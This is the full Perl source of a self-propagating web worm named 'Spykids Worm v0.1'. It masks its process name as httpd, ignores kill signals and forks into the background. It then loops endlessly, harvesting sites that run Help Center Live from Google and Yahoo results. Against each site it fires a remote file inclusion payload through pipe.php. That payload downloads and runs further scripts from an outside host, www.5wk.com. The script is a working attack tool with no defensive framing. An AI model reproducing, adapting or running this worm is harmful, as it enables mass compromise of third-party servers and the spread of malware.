   #!/usr/bin/perl

   use LWP::Simple;
   use IO::Socket::INET;

   ########################
   #                      #
   #  Spykids Worm v0.1   #
   #                      #
   ########################


   my $processo = "/usr/local/sbin/httpd";
   $SIG{"INT"} = "IGNORE";
   $SIG{"HUP"} = "IGNORE";
   $SIG{"TERM"} = "IGNORE";
   $SIG{"CHLD"} = "IGNORE";
   $SIG{"PS"} = "IGNORE";

   $0="$processo"."\0"x16;;
   my $pid=fork;
   exit if $pid;
   die "Problema com o fork: $!" unless defined($pid);

   while(1){




   @pasta = ("/livehelp/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/hcl/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/support/faq/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/help/faq/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/helpcenter/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra",
   "/live-support/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=wget www.5wk.com/spykids;perl spykids;wget www.5wk.com/hack;perl hack;wget www.5wk.com/registra");

   $oc = "\"Powered by Help Center Live\"";

   &worm($oc);

   }




   ########################
   #                      #
   #  Spykids Worm v0.1   #
   #                      #
   ########################

   sub worm{

   $procura = 'inurl:' . $_[0];




   $caxe = ".";
   $caxe1 = ".";
   $arq = ".";
   $arq .= int rand(9999);

   open(sites,">$arq");
   print sites "";
   close(sites);




   for($n=0;$n<900;$n += 10){
   $sock = IO::Socket::INET->new(PeerAddr => "www.google.com.br", PeerPort => 80, Proto => "tcp") or next;
   print $sock "GET /search?q=$procura&start=$n HTTP/1.0\n\n";
   @resu = <$sock>;
   close($sock);
   $ae = "@resu";
   while ($ae=~ m/<a href=.*?>.*?<\/a>/){
     $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
     $uber=$1;
       if ($uber !~/translate/)
       {
       if ($uber !~ /cache/)
       {
       if ($uber !~ /"/)
       {
       if ($uber !~ /google/)
       {
       if ($uber !~ /216/)
       {
       if ($uber =~/http/)
       {
       if ($uber !~ /start=/)
       {
             substr($uber, 0, 7) ="";
             $nu = index $uber, '/';
             $uber = substr($uber,0,$nu);
         open(arq,">>$arq");
             print arq "$uber\n";
             close(arq);
   }}}}}}}}}


   for($cadenu=1;$cadenu <= 991; $cadenu +=10){

   @cade = get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu") or next;
   $ae = "@cade";

   while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
     $ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
     $uber=$1;

   $uber =~ s/ //g;
   $uber =~ s/<b>//g;
   $uber =~ s/<\/b>//g;
           substr($uber, 0, 7) ="";
           $nu = index $uber, '/';
           $uber = substr($uber,0,$nu);
   open(a,">>$arq");
   print a "$uber\n";
   close(a);
   }}

   $ark = $arq;
   @si = "";
   open (arquivo,"<$ark");
   @si = <arquivo>;
   close(arquivo);
   $novo ="";
   foreach (@si){
   if (!$si{$_})
   {
   $novo .= $_;
   $si{$_} = 1;
   }
   }
   open (arquivo,">$ark");
   print arquivo $novo;
   close(arquivo);


   open(a,"<$arq");
   @site = <a>;
   close(a);

   foreach $site (@site){
   foreach $dir (@pasta){

   $site = 'http://' . $site . $dir;
   $ae = get($site) or next;
   }
   }
   }
